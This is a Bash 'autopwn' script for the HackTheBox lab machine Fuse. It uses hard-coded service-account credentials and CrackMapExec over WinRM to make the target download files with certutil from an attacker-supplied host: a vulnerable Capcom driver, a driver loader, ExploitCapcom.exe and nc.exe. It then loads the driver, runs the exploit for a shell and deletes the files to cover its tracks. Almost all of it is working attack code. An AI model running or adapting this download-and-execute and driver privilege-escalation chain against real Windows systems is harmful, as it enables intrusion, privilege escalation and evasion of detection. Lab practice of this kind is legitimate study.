#Autopwn para la maquina Fuse de HackTheBox.
#by. lanz

#!/bin/bash

# Aqui pa jakear un ratones

# Colours
declare -r greenColour="\e[0;32m\033[1m"
declare -r redColour="\e[0;31m\033[1m"
declare -r blueColour="\e[0;34m\033[1m"
declare -r yellowColour="\e[0;33m\033[1m"
declare -r purpleColour="\e[0;35m\033[1m"
declare -r turquoiseColour="\e[0;36m\033[1m"
declare -r grayColour="\e[0;37m\033[1m"
declare -r endColour="\033[0m\e[0m"

# Variables
rhost=$1
rport=$2
route_cme='/opt/CrackMapExec/cme'
ipfuse='10.10.10.193'
username='svc-print'
password='$fab@s3Rv1ce$1'

# Files to upload
declare -a files=('Capcom.sys' 'ExploitCapcom.exe' 'VbLoadDriver.exe' 'nc.exe')

echo -e "\n${yellowColour}[*] AutoPWN Fuse ${greenColour}HackTheBox${endColour}${endColour}${redColour} by. lanzf${endColour}"

trap ctrl_c INT 
function ctrl_c(){
  echo -e "\n${redColour}[!] Exiting...${endColour}"
  echo -e "\n${redColour}[!] Deleting files${endColour}\n"
  $route_cme winrm $ipfuse -u $username -p $password -X "del C:\\test\\${files[0]}; del C:\\test\\${files[1]}; del C:\\test\\${files[2]}; del C:\\test\\${files[3]}" > /dev/null
  exit 1
}

if [[ -z "$rhost" || -z "$rport" ]]; then
  echo -e "\n${redColour}[!] Usage: $0 <rhost> <rwebport>${endColour}"
  echo -e "${redColour}Example: $0 10.10.10.10 8000${endColour}\n"
  exit 1
fi

# ------------------------------------- Uploading files 

# Capcom.sys
echo -e "\n${blueColour}[+] Uploading driver${endColour}${grayColour} ${files[0]}${endColour}"
$route_cme winrm $ipfuse -u $username -p $password -X "certutil.exe -f -urlcache -split http://$rhost:$rport/${files[0]} C:\\test\\${files[0]}" | tail -1
sleep 1

# VbLoadDriver.exe
echo -e "\n${blueColour}[+] Uploading driver manager${endColour}${grayColour} ${files[2]}${endColour}"
$route_cme winrm $ipfuse -u $username -p $password -X "certutil.exe -f -urlcache -split http://$rhost:$rport/${files[2]} C:\\test\\${files[2]}" | tail -1
sleep 1

# ExploitCapcom.exe
echo -e "\n${blueColour}[+] Uploading${endColour}${grayColour} ${files[1]}${endColour}"
$route_cme winrm $ipfuse -u $username -p $password -X "certutil.exe -f -urlcache -split http://$rhost:$rport/${files[1]} C:\\test\\${files[1]}" | tail -1
sleep 1

# nc.exe
echo -e "\n${blueColour}[+] Uploading${endColour}${grayColour} ${files[3]}${endColour}"
$route_cme winrm $ipfuse -u $username -p $password -X "certutil.exe -f -urlcache -split http://$rhost:$rport/${files[3]} C:\\test\\${files[3]}" | tail -1
sleep 1

# ------------------------------------- Exploitation

echo -e "\n${yellowColour}[!] Prepare your netcat${endColour}"
sleep 2

echo -e "\n${yellowColour}[+] Loading driver${endColour}${grayColour} ${files[2]}${endColour}"
$route_cme winrm $ipfuse -u $username -p $password -X "C:\\test\\${files[2]} HKU\S-1-5-21-2633719317-1471316042-3957863514-1104\System\CurrentControlSet\Services\Capcom C:\test\${files[2]}" | tail -1
sleep 1

echo -e "\n${yellowColour}[+] Executing${endColour}${grayColour} ${files[1]}${endColour} and getting a shell."
$route_cme winrm $ipfuse -u $username -p $password -X "C:\\test\\${files[1]}" > /dev/null
sleep 1

# ------------------------------------- Deleting files 

echo -e "\n${blueColour}[+] Deleting files${endColour}"
$route_cme winrm $ipfuse -u $username -p $password -X "del C:\\test\\${files[0]}; del C:\\test\\${files[1]}; del C:\\test\\${files[2]}; del C:\\test\\${files[3]}" > /dev/null
sleep 1

echo -e "\n${greenColour}[+] We d0ne!${endColour}\n"
sleep 1
